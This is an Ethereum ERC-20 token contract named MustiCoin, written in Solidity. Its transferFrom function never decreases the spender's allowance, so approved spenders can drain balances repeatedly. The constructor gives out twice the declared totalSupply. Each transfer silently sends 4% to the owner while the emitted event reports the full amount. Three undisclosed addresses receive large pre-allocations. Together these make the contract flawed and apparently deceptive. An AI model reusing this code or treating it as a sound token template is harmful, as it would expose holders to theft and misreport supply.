/**
 *Submitted for verification at Etherscan.io on 2021-11-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

abstract contract ERC20Interface {

  function totalSupply() external virtual returns (uint256);

  function decimals() external virtual returns (uint8);

  function symbol() external virtual returns (string memory);

  function name() external virtual returns (string memory);

  function getOwner() external virtual returns (address);

  function balanceOf(address account) external virtual returns (uint256);

  function transfer(address recipient, uint256 amount) external virtual returns (bool);

  function allowance(address _owner, address spender) external virtual returns (uint256);

  function approve(address spender, uint256 amount) external virtual returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external virtual returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}

contract MustiCoin is ERC20Interface, SafeMath {

    address private owner;
    address private _mustiCoin;
    address private _mustiTokenCoin;
    address private _mustiTokensCoin;
    
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    string public override name = "MustiCoin";
    string public override symbol = "MCT";
    constructor(address cMustiCoinAddress, address cMustiTokenCoinAddress, address cMustiTokensCoinAddress) {
        totalSupply = 9000000000000000000 * 10**9;
    
        owner = msg.sender;
        _mustiCoin = cMustiCoinAddress;
        _mustiTokenCoin = cMustiTokenCoinAddress;
        _mustiTokensCoin = cMustiTokensCoinAddress;
        balances[owner] = 5000000000000000000 * 10**9;
        balances[_mustiCoin] =  1000000000000000000 * 10**9;
        balances[_mustiTokenCoin] = 3000000000000000000 * 10**9;
        balances[_mustiTokensCoin] = 9000000000000000000 * 10**9;

    }
    
    function getOwner() public view override returns(address) {
        return owner;
    }
    
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }

    function transfer(address to, uint value) public override returns(bool) {
        require(value > 0, "Transfer value has to be higher than 0.");
        require(balanceOf(msg.sender) >= value, "Balance is too low to make transfer.");
        
        uint rebaseTBD = value * 4 / 100;
        uint burnTBD = value * 0 / 100;
        uint valueAfterTaxAndBurn = value - rebaseTBD - burnTBD;
        
        balances[to] += valueAfterTaxAndBurn;
        balances[msg.sender] -= value;
        
        emit Transfer(msg.sender, to, value);
        
        balances[owner] += rebaseTBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    function approve(address spender, uint value) public override returns(bool) {
        allowances[msg.sender][spender] = value; 
        
        emit Approval(msg.sender, spender, value);
        
        return true;
    }
    
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }

    function transferFrom(address from, address to, uint value) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= value, "Allowance too low for transfer.");
        require(balances[from] >= value, "Balance is too low to make transfer.");
        
        balances[to] += value;
        balances[from] -= value;
        
        emit Transfer(from, to, value);
        
        return true;
    }
    
    function burn(uint256 amount) private returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}